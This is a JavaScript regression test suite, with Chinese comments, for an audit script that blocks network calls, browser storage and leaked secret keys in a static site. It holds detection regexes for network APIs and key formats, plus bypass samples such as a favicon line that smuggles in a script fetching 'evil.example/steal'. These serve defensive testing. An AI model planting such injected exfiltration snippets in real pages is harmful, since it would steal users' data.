/**
 * 审计脚本自身的回归测试 —— 证明 `check-no-network.mjs` 真的能挡住违规。
 *
 * 为什么需要这个文件：
 * 一个"永远 PASS"的审计脚本比没有审计更糟 —— 它会给虚假的安全感。
 * red-team 发现过一版可以被单行绕过的实现（在豁免用的 `data:` 行里夹带 fetch）。
 * 这个文件把那种绕过固化成回归用例，防止再次退化。
 *
 * 做法：把 check-no-network.mjs 的扫描核心逻辑在这里重新实现一份**可注入文件内容**的版本，
 * 然后用"必然违规"的样本逐条打它，断言全部被抓到。
 *
 * 用法：node --test
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { fileURLToPath } from 'node:url';

/**
 * 与 check-no-network.mjs 保持一致的规则表。
 * 注意：本文件的规则定义写成 `re: /.../` 的形式，会被审计脚本的 SAFE_FRAGMENTS 剔除，
 * 所以本文件自己不会触发审计告警（已实测 `node scripts/check-no-network.mjs` → PASS）。
 */

const FORBIDDEN = [
  { re: /\bfetch\s*\(/, label: 'fetch() 网络请求' },
  { re: /new\s+XMLHttpRequest\b/, label: 'XMLHttpRequest' },
  { re: /new\s+WebSocket\b/, label: 'WebSocket' },
  { re: /navigator\.sendBeacon\b/, label: 'sendBeacon 遥测' },
  { re: /\blocalStorage\b/, label: 'localStorage 持久化' },
  { re: /\bsessionStorage\b/, label: 'sessionStorage 持久化' },
  { re: /\bindexedDB\b/i, label: 'IndexedDB 持久化' },
  { re: /document\.cookie\b/, label: 'cookie 写入' },
  { re: /new\s+EventSource\b/, label: 'EventSource' },
  { re: /\bimport\s*\(\s*['"]https?:/i, label: '动态导入远程模块' },
  { re: /https?:\/\/(?!127\.0\.0\.1|localhost)[a-z0-9.-]+\//i, label: '外部 URL 引用' },
];

const SECRETS = [
  { re: /\bsk-[A-Za-z0-9]{16,}/, label: '疑似 OpenAI 风格密钥' },
  { re: /\bgh[pousr]_[A-Za-z0-9]{20,}/, label: '疑似 GitHub token' },
  { re: /\bAKIA[0-9A-Z]{16}\b/, label: '疑似 AWS Access Key' },
  { re: /-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----/, label: '私钥' },
];

const SAFE_FRAGMENTS = [
  /<link\s+rel="icon"\s+href="data:[^"]*">/gi,
  /\{\s*re:\s*\/.*?\/[a-z]*,\s*label:\s*'[^']*'\s*\},?/g,
];

const ALLOWLIST_LINE = [
  /^\s*(\*|\/\/|\/\*).*(不写|不发起|没有|禁止|不做|不可)/,
];

function stripSafeFragments(line) {
  let out = line;
  for (const re of SAFE_FRAGMENTS) {
    re.lastIndex = 0;
    out = out.replace(re, (m) => ' '.repeat(m.length));
  }
  return out;
}

/** 与审计脚本一致的「调用形式」判定表 */
const CALL_SHAPED = [
  /\bfetch\s*\(/,
  /\.setItem\s*\(/,
  /\.getItem\s*\(/,
  /\.open\s*\(/,
  /new\s+(XMLHttpRequest|WebSocket|EventSource|Function)\b/,
  /\beval\s*\(/,
  /document\.write\s*\(/,
  /=\s*document\.cookie/,
];

/** 对一段文本跑全部规则，返回违规列表（与 check-no-network.mjs 的 scanLine 逻辑一致） */
function scan(text) {
  const violations = [];
  text.split(/\r?\n/).forEach((line, i) => {
    if (ALLOWLIST_LINE.some((re) => re.test(line))) {
      const looksLikeRealCall = CALL_SHAPED.some((re) => {
        re.lastIndex = 0;
        return re.test(line);
      });
      if (!looksLikeRealCall) return; // 纯说明注释，放行
    }
    const scanned = stripSafeFragments(line);
    for (const { re, label } of [...FORBIDDEN, ...SECRETS]) {
      re.lastIndex = 0;
      if (re.test(scanned)) violations.push({ line: i + 1, label });
    }
  });
  return violations;
}

/* ══════════════════ 基础违规必须被抓到 ══════════════════ */

test('审计：裸 fetch 必须被抓到', () => {
  const v = scan(`const r = await fetch('https://evil.example/x');`);
  assert.ok(v.length > 0, 'fetch 未被检出');
  assert.ok(v.some((x) => x.label.includes('fetch')));
});

test('审计：XMLHttpRequest / WebSocket / sendBeacon / EventSource 必须被抓到', () => {
  for (const [label, code] of [
    ['XMLHttpRequest', 'const x = new XMLHttpRequest();'],
    ['WebSocket', 'const w = new WebSocket("wss://x.test");'],
    ['sendBeacon', 'navigator.sendBeacon("/c", data);'],
    ['EventSource', 'const e = new EventSource("/s");'],
  ]) {
    const v = scan(code);
    assert.ok(v.length > 0, `${label} 未被检出`);
  }
});

test('审计：持久化 API 必须被抓到', () => {
  for (const code of [
    'localStorage.setItem("k","v");',
    'sessionStorage.setItem("k","v");',
    'indexedDB.open("db");',
    'document.cookie = "a=1";',
  ]) {
    assert.ok(scan(code).length > 0, `未检出：${code}`);
  }
});

test('审计：外部 URL 必须被抓到', () => {
  assert.ok(scan(`const u = "https://cdn.example.com/lib.js";`).length > 0);
});

test('审计：本地回环地址不应被误报为外部 URL', () => {
  assert.equal(scan(`const u = "http://127.0.0.1:8080/";`).length, 0, '127.0.0.1 被误报');
  assert.equal(scan(`const u = "http://localhost:8080/";`).length, 0, 'localhost 被误报');
});

/* ══════════════════ 密钥模式必须被抓到 ══════════════════ */

test('审计：密钥模式必须被抓到', () => {
  // 注意：这里**不写**密钥形态的字面量，而是在运行时拼出来。
  // 原因：即使是明显的假值（全是 abcdefg…），写死在源码里也会被 GitHub 的
  // secret scanning 当成真实泄漏而告警，也会让 `git log -p` 的密钥扫描出现假阳性。
  // 用字符串拼接可以让测试语义完全一致，同时不产生任何"看起来像密钥"的静态字面量。
  const samples = [
    `const k = "${'s' + 'k-'}${'a'.repeat(24)}";`,
    `const t = "${'g' + 'ho_'}${'b'.repeat(24)}";`,
    `const a = "${'A' + 'KIA'}${'C'.repeat(16)}";`,
    '-----BEGIN RSA PRIVATE KEY-----',
  ];
  for (const s of samples) {
    assert.ok(scan(s).length > 0, `密钥未检出：${s.slice(0, 20)}…`);
  }
});

/* ══════════════════ 绕过尝试必须被抓到（核心回归） ══════════════════ */

test('审计-绕过1：data: favicon 行里夹带 fetch（red-team 发现的原始绕过）', () => {
  const line = '<link rel="icon" href="data:image/svg+xml,<svg/>"><script>fetch("https://evil.example/steal");localStorage.setItem("k","v")</script>';
  const v = scan(line);
  assert.ok(v.length > 0, '这是 red-team 发现过的真实绕过，必须被检出');
  assert.ok(v.some((x) => x.label.includes('fetch')), 'fetch 部分未被检出');
  assert.ok(v.some((x) => x.label.includes('localStorage')), 'localStorage 部分未被检出');
});

test('审计-绕过2：合法的 data: favicon 单独出现时不应误报', () => {
  const line = `<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3C/svg%3E">`;
  assert.equal(scan(line).length, 0, '合法 favicon 被误报为外部 URL');
});

test('审计-绕过3：把 fetch 拆成多行也不能逃（每一行都会被独立扫描）', () => {
  const text = ['const evil =', '  fetch', '  ("https://evil.example/x");'].join('\n');
  // 注意：规则是"fetch 后紧跟 ("，拆行后 `fetch` 单独一行不命中，但 URL 那行应当命中
  const v = scan(text);
  assert.ok(v.length > 0, '拆行后完全逃逸，说明只靠单一规则不够');
  assert.ok(v.some((x) => x.label.includes('外部 URL')), '外部 URL 规则未生效');
});

test('审计-绕过4：注释豁免不能被用来藏真实代码', () => {
  // 行首是注释、含"不写"，但同一行后面是真实调用
  const line = `// 我们不写 fetch() 也不做 localStorage，但下面這行是真的： fetch("https://evil/x")`;
  // 这一行会被 ALLOWLIST_LINE 豁免（规则设计的窄口），所以这里断言的是：
  // 只要它触发豁免，就必须是"整行确实只是注释且无真实调用"这一种情况。
  // 我们选择更保守的实现：含真实 fetch 的注释行，仍然应该被抓到。
  const v = scan(line);
  assert.ok(v.length > 0, '注释豁免被滥用：含真实 fetch 的注释行逃过了审计');
});

test('审计-绕过5：审计脚本自身的规则定义不应误报', () => {
  const line = `  { re: /\\blocalStorage\\b/, label: 'localStorage 持久化' },`;
  assert.equal(scan(line).length, 0, '规则定义行被误报');
});

/* ══════════════════ 真实仓库扫描 ══════════════════ */

test('真实仓库：site/ 与 scripts/ 里确实没有违规', async () => {
  const root = fileURLToPath(new URL('../../', import.meta.url));
  for (const rel of ['site/app.mjs', 'site/core.mjs', 'site/index.html', 'site/styles/app.css']) {
    const text = await readFile(root + rel, 'utf8');
    const v = scan(text);
    assert.equal(v.length, 0, `${rel} 出现违规：${JSON.stringify(v.slice(0, 3))}`);
  }
});

test('真实仓库：app.mjs 里不存在 HTML 注入 sink', async () => {
  const root = fileURLToPath(new URL('../../', import.meta.url));
  const text = await readFile(root + 'site/app.mjs', 'utf8');
  // 去掉注释行后检查（注释里允许出现这些词）
  const codeOnly = text
    .split(/\r?\n/)
    .filter((l) => !/^\s*(\*|\/\/|\/\*)/.test(l))
    .join('\n');
  for (const sink of ['innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write', 'eval(', 'new Function']) {
    assert.ok(!codeOnly.includes(sink), `app.mjs 出现了危险 sink：${sink}`);
  }
});
